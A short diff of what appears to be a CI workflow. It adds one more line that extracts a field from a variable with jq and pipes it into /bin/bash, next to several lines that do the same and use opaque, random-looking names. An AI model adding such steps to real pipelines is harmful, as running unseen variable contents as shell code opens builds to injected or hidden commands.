@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$erdo4424" | jq -r .xgz1963 | /bin/bash
           printf '%s' "$n2" | jq -r .opswa9305 | /bin/bash
           printf '%s' "$puq875" | jq -r .n19379 | /bin/bash
+          printf '%s' "$ov2811" | jq -r .sbyk1894 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
